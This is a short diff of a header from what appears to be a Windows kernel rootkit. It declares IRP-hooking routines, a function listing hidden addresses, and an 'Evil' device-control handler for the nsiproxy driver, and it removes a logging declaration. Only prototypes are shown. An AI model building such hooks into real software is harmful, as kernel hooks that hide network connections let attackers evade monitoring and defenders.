@@ -15,7 +15,6 @@ namespace irphooking {
 		void ListAllHiddenAddresses();
 	}
 
-	NTSTATUS LogAttackerIpAddress();
 	NTSTATUS InitializeIrpHook(ULONG DriverTag, ULONG MajorFunction, PVOID HookingFunction);
 	NTSTATUS ReleaseIrpHook(ULONG DriverTag, ULONG MajorFunction);
 	NTSTATUS EvilMajorDeviceControlNsiProxy(IN PDEVICE_OBJECT DeviceObject,
